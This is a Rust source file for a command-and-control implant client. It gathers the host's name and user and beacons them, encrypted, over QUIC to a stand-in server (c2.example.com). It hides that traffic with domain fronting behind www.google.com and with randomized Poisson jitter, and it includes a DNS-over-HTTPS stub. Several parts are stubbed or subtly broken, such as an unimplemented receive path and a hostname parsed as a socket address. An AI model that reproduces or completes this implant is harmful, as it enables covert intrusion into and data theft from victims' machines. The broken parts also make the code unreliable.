use anyhow::{anyhow, Result};
use chacha20poly1305::{
    aead::{Aead, KeyInit, OsRng},
    ChaCha20Poly1305, Nonce,
};
use quinn::{ClientConfig, Endpoint};
use rustls::{ClientConfig as RustlsClientConfig, RootCertStore};
use serde::{Deserialize, Serialize};
use std::net::SocketAddr;
use std::sync::Arc;
use std::time::Duration;
use tokio::time::sleep;
use rand::distributions::{Distribution, Poisson};
use rand::Rng;

#[derive(Debug, Serialize, Deserialize)]
pub enum C2Message {
    Beacon {
        session_id: String,
        hostname: String,
        username: String,
        timestamp: u64,
    },
    Task {
        task_id: String,
        command: String,
        args: Vec<String>,
    },
    Result {
        task_id: String,
        output: String,
        exit_code: i32,
    },
    Heartbeat {
        session_id: String,
        status: String,
    },
}

#[derive(Debug, Clone)]
pub struct C2Config {
    pub c2_domain: String,
    pub c2_port: u16,
    pub fronting_domain: String,
    pub doh_server: String,
    pub session_key: [u8; 32],
    pub jitter_lambda: f64,
}

impl Default for C2Config {
    fn default() -> Self {
        C2Config {
            c2_domain: "c2.example.com".to_string(),
            c2_port: 443,
            fronting_domain: "www.google.com".to_string(),
            doh_server: "https://dns.google/dns-query".to_string(),
            session_key: [0u8; 32],
            jitter_lambda: 2.0,
        }
    }
}

pub struct C2Client {
    config: C2Config,
    endpoint: Option<Endpoint>,
    cipher: ChaCha20Poly1305,
}

impl C2Client {
    pub fn new(config: C2Config) -> Result<Self> {
        let cipher = ChaCha20Poly1305::new(&config.session_key.into());
        Ok(C2Client {
            config,
            endpoint: None,
            cipher,
        })
    }
    
    pub async fn connect(&mut self) -> Result<()> {
        let mut endpoint = Endpoint::client("0.0.0.0:0".parse().unwrap())?;
        let mut root_store = RootCertStore::empty();
        root_store.add_server_trust_anchors(
            webpki_roots::TLS_SERVER_ROOTS.0.iter().map(|ta| {
                rustls::OwnedTrustAnchor::from_subject_spki_name_constraints(
                    ta.subject,
                    ta.spki,
                    ta.name_constraints,
                )
            })
        );
        let tls_config = RustlsClientConfig::builder()
            .with_safe_defaults()
            .with_root_certificates(root_store)
            .with_no_client_auth();
        let client_config = ClientConfig::new(Arc::new(tls_config));
        endpoint.set_default_client_config(client_config);
        self.endpoint = Some(endpoint);
        Ok(())
    }
    
    pub async fn send_beacon(&self, session_id: &str) -> Result<()> {
        let hostname = gethostname::gethostname().to_string_lossy().to_string();
        let username = std::env::var("USER").unwrap_or_else(|_| "unknown".to_string());
        let timestamp = std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)?
            .as_secs();
        let beacon = C2Message::Beacon {
            session_id: session_id.to_string(),
            hostname,
            username,
            timestamp,
        };
        self.send_message(beacon).await
    }
    
    pub async fn send_message(&self, message: C2Message) -> Result<()> {
        let serialized = bincode::serialize(&message)?;
        let nonce = ChaCha20Poly1305::generate_nonce(&mut OsRng);
        let encrypted = self.cipher.encrypt(&nonce, serialized.as_ref())
            .map_err(|e| anyhow!("Encryption failed: {}", e))?;
        if let Some(endpoint) = &self.endpoint {
            let addr: SocketAddr = format!("{}:{}", self.config.c2_domain, self.config.c2_port)
                .parse()?;
            let connection = endpoint.connect(addr, &self.config.fronting_domain)?.await?;
            let mut stream = connection.open_uni().await?;
            stream.write_all(nonce.as_slice()).await?;
            stream.write_all(&encrypted).await?;
            stream.finish().await?;
        }
        Ok(())
    }
    
    pub async fn receive_message(&self) -> Result<C2Message> {
        Err(anyhow!("Not implemented"))
    }

    pub async fn calculate_jitter(&self) -> Duration {
        let poisson = Poisson::new(self.config.jitter_lambda).unwrap();
        let delay_seconds = poisson.sample(&mut rand::thread_rng()) as u64;
        let base_delay = Duration::from_secs(delay_seconds * 60);
        let random_extra = Duration::from_secs(rand::thread_rng().gen_range(0..300));
        base_delay + random_extra
    }
    
    pub async fn run_beacon_loop(&self, session_id: &str) -> Result<()> {
        loop {
            self.send_beacon(session_id).await?;
            let jitter = self.calculate_jitter().await;
            sleep(jitter).await;
        }
    }
}

pub struct DoHResolver {
    server_url: String,
}

impl DoHResolver {
    pub fn new(server_url: String) -> Self {
        DoHResolver { server_url }
    }
    
    pub async fn resolve(&self, _domain: &str) -> Result<Vec<std::net::IpAddr>> {
        Ok(vec![])
    }
}

pub struct DomainFronting {
    fronting_domain: String,
    target_domain: String,
}

impl DomainFronting {
    pub fn new(fronting_domain: String, target_domain: String) -> Self {
        DomainFronting {
            fronting_domain,
            target_domain,
        }
    }

    pub fn get_sni(&self) -> &str {
        &self.fronting_domain
    }
    
    pub fn get_host_header(&self) -> &str {
        &self.target_domain
    }
}
